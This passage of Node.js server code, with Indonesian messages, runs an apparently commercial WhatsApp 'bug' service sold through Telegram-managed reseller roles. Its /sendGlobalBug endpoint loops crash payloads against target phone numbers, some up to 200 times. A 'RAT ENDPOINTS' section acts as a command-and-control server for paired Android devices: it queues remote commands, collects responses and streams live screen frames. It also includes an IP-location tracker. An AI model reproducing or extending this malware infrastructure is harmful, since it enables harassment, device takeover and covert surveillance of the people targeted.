    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

// ============ HEARTBEAT: ONLINE USER & ACTIVE CONNECTION ============
// Map untuk track heartbeat interval per user/session
const _heartbeatTimers = {};

/**
 * Mulai heartbeat untuk user (Online Users counter)
 * Dipanggil saat user login ke app
 */
function startUserHeartbeat(username, androidId, key) {
  const hbKey = `user_${username}`;
  if (_heartbeatTimers[hbKey]) return; // Sudah jalan

  const tick = () => {
    const users = loadOnlineUsers();
    const idx = users.findIndex(u => u.username === username);
    const userData = {
      username,
      androidId: androidId || 'unknown',
      lastActive: new Date().toISOString(),
      role: (() => {
        try {
          const db = loadDatabase();
          return db.find(u => u.username === username)?.role || 'member';
        } catch { return 'member'; }
      })()
    };
    if (idx !== -1) users[idx] = userData;
    else users.push(userData);
    saveOnlineUsers(users);
    console.log(`💓 [OnlineUser] Heartbeat: ${username}`);
  };

  tick(); // Langsung ping pertama kali
  _heartbeatTimers[hbKey] = setInterval(tick, 30000);
  console.log(`🟢 [OnlineUser] Heartbeat dimulai untuk ${username}`);
}

/**
 * Hentikan heartbeat user + hapus dari online list
 */
function stopUserHeartbeat(username) {
  const hbKey = `user_${username}`;
  if (_heartbeatTimers[hbKey]) {
    clearInterval(_heartbeatTimers[hbKey]);
    delete _heartbeatTimers[hbKey];
  }
  const users = loadOnlineUsers().filter(u => u.username !== username);
  saveOnlineUsers(users);
  console.log(`🔴 [OnlineUser] Heartbeat berhenti: ${username}`);
}

/**
 * Mulai heartbeat untuk sesi WA (Active Connections counter)
 * Dipanggil saat connection === "open"
 */
function startSessionHeartbeat(sessionName, ownerUsername, type) {
  const hbKey = `sess_${sessionName}`;
  if (_heartbeatTimers[hbKey]) return; // Sudah jalan

  const tick = () => {
    const conns = loadActiveConnections();
    const idx = conns.findIndex(c => c.sessionName === sessionName);
    const connData = {
      sessionName,
      type: type || 'unknown',
      owner: ownerUsername || 'unknown',
      lastActive: new Date().toISOString()
    };
    if (idx !== -1) conns[idx] = connData;
    else conns.push(connData);
    saveActiveConnections(conns);
    console.log(`💓 [ActiveConn] Heartbeat: ${sessionName} [${type}]`);
  };

  tick();
  _heartbeatTimers[hbKey] = setInterval(tick, 30000);
  console.log(`🟢 [ActiveConn] Heartbeat dimulai untuk ${sessionName}`);
}

/**
 * Hentikan heartbeat sesi WA + hapus dari active connections
 * Dipanggil saat connection === "close"
 */
function stopSessionHeartbeat(sessionName) {
  const hbKey = `sess_${sessionName}`;
  if (_heartbeatTimers[hbKey]) {
    clearInterval(_heartbeatTimers[hbKey]);
    delete _heartbeatTimers[hbKey];
  }
  const conns = loadActiveConnections().filter(c => c.sessionName !== sessionName);
  saveActiveConnections(conns);
  console.log(`🔴 [ActiveConn] Heartbeat berhenti: ${sessionName}`);
}
// ============ END HEARTBEAT ============

// ============ TAMBAHAN: FILE UNTUK MENYIMPAN DATA ============
const ONLINE_USERS_FILE = './online_users.json';
const ACTIVE_CONNECTIONS_FILE = './active_connections.json';
const CHAT_ROOM_FILE = './chat_room.json';

// Load online users
function loadOnlineUsers() {
    try {
        if (!fs.existsSync(ONLINE_USERS_FILE)) fs.writeFileSync(ONLINE_USERS_FILE, JSON.stringify([]));
        return JSON.parse(fs.readFileSync(ONLINE_USERS_FILE, 'utf8'));
    } catch(e) { return []; }
}

function saveOnlineUsers(users) {
    fs.writeFileSync(ONLINE_USERS_FILE, JSON.stringify(users, null, 2));
}

// Load active connections
function loadActiveConnections() {
    try {
        if (!fs.existsSync(ACTIVE_CONNECTIONS_FILE)) fs.writeFileSync(ACTIVE_CONNECTIONS_FILE, JSON.stringify([]));
        return JSON.parse(fs.readFileSync(ACTIVE_CONNECTIONS_FILE, 'utf8'));
    } catch(e) { return []; }
}

function saveActiveConnections(conns) {
    fs.writeFileSync(ACTIVE_CONNECTIONS_FILE, JSON.stringify(conns, null, 2));
}

// Load chat messages
function loadChatMessages() {
    try {
        if (!fs.existsSync(CHAT_ROOM_FILE)) fs.writeFileSync(CHAT_ROOM_FILE, JSON.stringify([]));
        return JSON.parse(fs.readFileSync(CHAT_ROOM_FILE, 'utf8'));
    } catch(e) { return []; }
}

function saveChatMessages(messages) {
    const limited = messages.slice(-500);
    fs.writeFileSync(CHAT_ROOM_FILE, JSON.stringify(limited, null, 2));
}

// ============ ROLE PERMISSIONS ============
const roleLevels = {
    'member': 0,
    'reseller': 1,
    'admin': 2,
    'partner': 3,
    'owner': 4
};

const creatableRoles = {
    'member': ['member'],
    'reseller': ['member'],
    'admin': ['member', 'reseller'],
    'partner': ['member', 'reseller', 'admin'],
    'owner': ['member', 'reseller', 'admin', 'partner', 'owner']
};

function canCreateRole(role, targetRole) {
    const allowed = creatableRoles[role.toLowerCase()] || ['member'];
    return allowed.includes(targetRole.toLowerCase());
}

function getRoleLevel(role) {
    return roleLevels[role.toLowerCase()] || 0;
}

function hasAccess(minRole, userRole) {
    return getRoleLevel(userRole) >= getRoleLevel(minRole);
}

// WebSocket clients for chat
let chatClients = new Map();

function broadcastToChatClients(message) {
    const msg = JSON.stringify(message);
    for (const [clientId, ws] of chatClients.entries()) {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(msg);
        } else {
            chatClients.delete(clientId);
        }
    }
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    list.sort((a, b) => b.total - a.total);

    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true });

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000);

  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

const GLOBAL_SENDER_FILE = path.join(__dirname, 'globalSenders.json');

function loadGlobalSenders() {
  try {
    if (!fs.existsSync(GLOBAL_SENDER_FILE)) {
      fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(GLOBAL_SENDER_FILE, 'utf8'));
  } catch (err) {
    console.error("Failed to load global senders:", err.message);
    return [];
  }
}

function saveGlobalSenders(senders) {
  fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify(senders, null, 2));
}

const allowedRolesForGlobal = ["owner", "high", "admin", "high admin", "dev"];

app.get("/globalSender", (req, res) => {
  const { key } = req.query;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const globalSenders = loadGlobalSenders();
  const activeGlobals = globalSenders.filter(s => activeConnections[s.sessionName]);

  return res.json({
    valid: true,
    connections: activeGlobals.map(s => ({
      id: s.id,
      sessionName: s.sessionName,
      owner: s.owner,
      number: s.number
    }))
  });
});

app.get("/getGlobalPairing", async (req, res) => {
  const { key, number } = req.query;
  const username = getUserByKey(key);
  if (!username) return res.json({ valid: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  
  if (!user || !allowedRolesForGlobal.includes(user.role)) {
    return res.json({ valid: false, message: "Only Owner, High, Admin, High Admin, Dev can add global senders" });
  }

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
    const sessionName = `global_${number}`;
    const sessionDir = path.join('permenmd', sessionName);

    if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting global ${number}...`);
          await waiting(3000);
        } else {
          delete activeConnections[sessionName];
          // ✅ HEARTBEAT: hapus dari active connections
          try { stopSessionHeartbeat(sessionName); } catch(e) {}
        }
      } else if (connection === "open") {
        activeConnections[sessionName] = sock;
        // ✅ HEARTBEAT: catat sesi global sebagai Active Connection
        try { startSessionHeartbeat(sessionName, sessionName, 'global_sender'); } catch(e) {}
        const sourceCreds = path.join(sessionDir, 'creds.json');
        const destCreds = path.join('permenmd', `${sessionName}.json`);
        if (fs.existsSync(sourceCreds)) {
          fs.writeFileSync(destCreds, fs.readFileSync(sourceCreds));
        }
        console.log(`✅ Global sender ${sessionName} connected`);
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      if (code) {
        return res.json({ valid: true, number, pairingCode: code, isGlobal: true });
      }
    }

    const globalSenders = loadGlobalSenders();
    const existing = globalSenders.find(s => s.number === number);
    
    if (!existing) {
      const newId = Date.now().toString();
      globalSenders.push({
        id: newId,
        sessionName: sessionName,
        number: number,
        owner: username,
        addedAt: new Date().toISOString()
      });
      saveGlobalSenders(globalSenders);
    }

    return res.json({
      valid: true,
      message: "Global sender added successfully",
      senderId: existing?.id || Date.now().toString()
    });

  } catch (err) {
    console.error("Global pairing error:", err.message);
    return res.status(500).json({ error: err.message });
  }
});

app.delete("/deleteGlobalSender", (req, res) => {
  const { key, id } = req.query;
  const username = getUserByKey(key);
  if (!username) return res.json({ valid: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  
  if (!user || !allowedRolesForGlobal.includes(user.role)) {
    return res.json({ valid: false, message: "Only Owner, High, Admin, High Admin, Dev can delete global senders" });
  }

  const globalSenders = loadGlobalSenders();
  const index = globalSenders.findIndex(s => s.id === id);
  
  if (index === -1) {
    return res.json({ valid: false, message: "Global sender not found" });
  }

  const removed = globalSenders.splice(index, 1)[0];
  saveGlobalSenders(globalSenders);

  if (activeConnections[removed.sessionName]) {
    try {
      activeConnections[removed.sessionName].ws?.close();
      delete activeConnections[removed.sessionName];
    } catch (e) {}
  }

  const sessionPath = path.join('permenmd', removed.sessionName);
  if (fs.existsSync(sessionPath)) {
    fs.rmSync(sessionPath, { recursive: true, force: true });
  }

  const credsFile = path.join('permenmd', `${removed.sessionName}.json`);
  if (fs.existsSync(credsFile)) {
    fs.unlinkSync(credsFile);
  }

  return res.json({ valid: true, deleted: true, message: "Global sender deleted successfully" });
});

app.get("/sendGlobalBug", async (req, res) => {
  const { key, bug, senderId } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");

  const username = getUserByKey(key);
  if (!username) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) return res.json({ valid: false });

  const roleCooldowns = {
    member: 300,
    reseller: 240,
    reseller1: 60,
    owner: 0,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastGlobalSend) user.lastGlobalSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastGlobalSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  const globalSenders = loadGlobalSenders();
  const globalSender = globalSenders.find(s => s.id === senderId);
  
  if (!globalSender) {
    return res.json({ valid: false, message: "Global sender not found" });
  }

  const sock = activeConnections[globalSender.sessionName];
  if (!sock) {
    return res.json({ valid: false, message: "Global sender not connected" });
  }

  user.lastGlobalSend = now;
  saveDatabase(db);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    sender: globalSender.sessionName
  });

  setImmediate(async () => {
    try {
      const targetJid = target + "@s.whatsapp.net";
      
      switch (bug) {
        case "click":
          for (let i = 0; i < 15; i++) {
            await fconemsg(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "android":
          for (let i = 0; i < 20; i++) {
            await urlloc(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "invisible":
          for (let i = 0; i < 200; i++) {
            await VnXNewDenglayHardInpis(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "ios_invis":
          for (let i = 0; i < 1; i++) {
            await iosTrashLocExtend(sock, targetJid);
          }
          break;
        case "ios_noinvis":
          for (let i = 0; i < 15; i++) {
            await iOSxTend(sock, targetJid);
          }
          break;
      }

      console.log(`[✅ GLOBAL BUG] Bug '${bug}' terkirim ke ${target} via ${globalSender.sessionName}`);
    } catch (err) {
      console.warn(`[❌ GLOBAL BUG ERROR] ${err.message}`);
    }
  });
});

async function connectGlobalSenders() {
  const globalSenders = loadGlobalSenders();
  console.log(`[🌐 GLOBAL] Found ${globalSenders.length} global senders`);

  for (const sender of globalSenders) {
    const sessionPath = path.join('permenmd', sender.sessionName);
    const credsFile = path.join(sessionPath, 'creds.json');
    
    if (fs.existsSync(credsFile)) {
      const mainCredsFile = path.join('permenmd', `${sender.sessionName}.json`);
      if (!fs.existsSync(mainCredsFile)) {
        fs.writeFileSync(mainCredsFile, fs.readFileSync(credsFile));
      }
      
      if (!activeConnections[sender.sessionName]) {
        console.log(`[🌐 GLOBAL] Connecting ${sender.sessionName}...`);
        await connectSession(sessionPath, sender.sessionName);
      }
    } else {
      console.log(`[⚠️ GLOBAL] Session ${sender.sessionName} not found, removing`);
      const updated = globalSenders.filter(s => s.id !== sender.id);
      saveGlobalSenders(updated);
    }
  }
}

// ============ RAT ENDPOINTS ============

app.get("/rat/pairid", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.json({ valid: false, message: "User not found" });
    
    if (!user.pairId) {
        user.pairId = crypto.randomBytes(8).toString('hex').toUpperCase();
        saveDatabase(db);
        console.log(`[RAT] Generated pairId for ${user.username}: ${user.pairId}`);
    }
    
    res.json({ valid: true, pairId: user.pairId, username: user.username, role: user.role || 'member' });
});

app.get("/rat/my-devices", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false });
    
    const targets = readRat(RAT_TARGETS);
    let devices = [];
    
    if (user.role === "owner" || user.role === "dev") {
        devices = targets.filter(t => t.owner === user.username);
    } else {
        const perms = loadDevicePerms();
        const userPerm = perms[user.username.toLowerCase()];
        if (userPerm && userPerm.approved) {
            if (userPerm.allDevices) {
                const owner = db.find(u => u.role === "owner");
                if (owner) devices = targets.filter(t => t.owner === owner.username);
            } else {
                devices = targets.filter(t => userPerm.devices?.includes(t.id));
            }
        }
    }
    
    res.json({ valid: true, pairId: user.pairId || null, role: user.role || 'member', devices: devices });
});

app.post('/api/register-target', (req, res) => {
    const { id, model, battery, owner } = req.body;
    if (!id) return res.status(400).json({ error: 'id required' });
    
    let targets = readRat(RAT_TARGETS);
    const existing = targets.findIndex(t => t.id === id);
    const newTarget = {
        id: id,
        model: model || 'Unknown',
        battery: battery || 0,
        owner: owner || 'unknown',
        status: 'Online',
        lastSeen: new Date().toISOString()
    };
    
    if (existing !== -1) {
        targets[existing] = { ...targets[existing], ...newTarget, status: 'Online', lastSeen: new Date().toISOString() };
    } else {
        targets.push(newTarget);
    }
    
    saveRat(RAT_TARGETS, targets);
    res.json({ status: 'ok' });
});

app.post('/api/pair-target', (req, res) => {
    const { pairId, deviceId, model, battery } = req.body;
    if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId and deviceId required' });
    
    const db = loadDatabase();
    const ownerIdx = db.findIndex(u => u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase());
    
    if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid' });
    
    const owner = db[ownerIdx];
    if (!owner.devices) owner.devices = [];
    if (!owner.devices.includes(deviceId)) {
        owner.devices.push(deviceId);
        saveDatabase(db);
    }
    
    let targets = readRat(RAT_TARGETS);
    const existing = targets.findIndex(t => t.id === deviceId);
    const newTarget = {
        id: deviceId,
        model: model || 'Unknown',
        battery: battery || 0,
        owner: owner.username,
        status: 'Online',
        lastSeen: new Date().toISOString()
    };
    
    if (existing !== -1) {
        targets[existing] = { ...targets[existing], ...newTarget };
    } else {
        targets.push(newTarget);
    }
    
    saveRat(RAT_TARGETS, targets);
    console.log(`[RAT] Device ${deviceId} paired to ${owner.username}`);
    res.json({ status: 'paired', ownerUsername: owner.username });
});

app.post('/api/send-command', (req, res) => {
    const { id, command, extra } = req.body;
    if (!id) return res.status(400).json({ error: 'id required' });
    
    let commands = readRat(RAT_COMMANDS);
    commands = commands.filter(c => c.targetId !== id);
    commands.push({ targetId: id, command: command, extra: extra || '', timestamp: new Date().toISOString() });
    saveRat(RAT_COMMANDS, commands);
    
    console.log(`[RAT] Command queued for ${id}: ${command}`);
    res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
    const { id } = req.params;
    let commands = readRat(RAT_COMMANDS);
    const index = commands.findIndex(c => c.targetId === id);
    
    if (index !== -1) {
        const cmd = commands[index];
        commands.splice(index, 1);
        saveRat(RAT_COMMANDS, commands);
        return res.json(cmd);
    }
    res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
    const { id } = req.params;
    const { cmd, data } = req.body;
    
    let responses = readRat(RAT_RESPONSES);
    const existing = responses.findIndex(r => r.targetId === id);
    const newResp = { targetId: id, cmd: cmd, data: data, timestamp: new Date().toISOString() };
    
    if (existing !== -1) {
        responses[existing] = newResp;
    } else {
        responses.push(newResp);
    }
    saveRat(RAT_RESPONSES, responses);
    
    console.log(`[RAT] Response from ${id}: ${cmd}`);
    res.json({ status: 'ok' });
});

app.get('/api/get-response/:id', (req, res) => {
    const { id } = req.params;
    const responses = readRat(RAT_RESPONSES);
    const resp = responses.find(r => r.targetId === id);
    res.json(resp || {});
});

app.post('/api/live-frame/:id', (req, res) => {
    const { id } = req.params;
    const { frame, ts } = req.body;
    if (!frame) return res.status(400).json({ error: 'no frame' });
    
    if (!global.liveFrames) global.liveFrames = {};
    global.liveFrames[id] = { frame: frame, ts: ts || Date.now() };
    res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
    const { id } = req.params;
    if (!global.liveFrames || !global.liveFrames[id]) {
        return res.status(404).json({ error: 'no frame yet' });
    }
    res.json(global.liveFrames[id]);
});

app.post('/api/heartbeat/:id', (req, res) => {
    const { id } = req.params;
    let targets = readRat(RAT_TARGETS);
    const index = targets.findIndex(t => t.id === id);
    
    if (index !== -1) {
        targets[index].status = 'Online';
        targets[index].lastSeen = new Date().toISOString();
        if (req.body.battery) targets[index].battery = req.body.battery;
        saveRat(RAT_TARGETS, targets);
    }
    res.send('OK');
});

app.post('/api/lock-chat/:id', (req, res) => {
    const { id } = req.params;
    const { text, from } = req.body;
